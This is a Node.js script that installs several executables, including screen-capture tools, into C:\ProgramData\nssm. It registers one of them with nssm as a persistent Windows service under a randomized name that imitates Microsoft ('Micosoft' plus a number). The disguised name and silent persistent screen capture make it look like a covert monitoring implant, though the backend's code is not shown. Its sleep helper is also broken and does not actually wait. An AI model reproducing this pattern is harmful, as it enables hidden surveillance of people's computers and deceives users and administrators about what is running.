const fs = require("fs");
const { execSync } = require("child_process");
const { STOPPED } = require("./status");

// const INSTALL_PATH = "C:\\ProgramData\\nssm\\";
// const BACKEND_NAME = "backend.exe";
// const BACKEND_PATH = `${INSTALL_PATH}${BACKEND_NAME}`;
// const NSSM_PATH = `${INSTALL_PATH}nssm.exe`;

const {
  INSTALL_PATH,
  BACKEND_NAME,
  BACKEND_PATH,
  NSSM_PATH,
} = require("../../my_config");

// const SERVICE_NAME = "ammc";

let SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;

function install() {
  try {
    let rs;
    fs.mkdirSync(INSTALL_PATH, { recursive: true });
    fs.copyFileSync("./nssm.exe", NSSM_PATH);
    fs.copyFileSync("./myScreenshot.exe", `${INSTALL_PATH}myScreenshot.exe`);
    fs.copyFileSync(
      "./screenCapture_1.3.2.exe",
      `${INSTALL_PATH}screenCapture_1.3.2.exe`
    );
    fs.copyFileSync("./" + BACKEND_NAME, BACKEND_PATH);
    // sleep(1000);
    execSync(`${NSSM_PATH} install ${SERVICE_NAME} ${BACKEND_PATH}`);
    // 检测服务是否安装完毕
    while (
      !execSync(`${NSSM_PATH} status ${SERVICE_NAME}`).equals(
        Buffer.from(STOPPED)
      )
    ) {
      sleep(300);
    }
    execSync(`${NSSM_PATH} start ${SERVICE_NAME}`);
    fs.writeFileSync(
      `${INSTALL_PATH}serviceName`,
      `${SERVICE_NAME}%${BACKEND_NAME}`
    );
    console.log("安装完毕");
    sleep(1000);
  } catch (e) {
    console.log(e);
    sleep(10000);
  }
}

function sleep(msec) {
  setTimeout(async function () {
    await new Promise((r) => r);
  }, msec);
}

install();
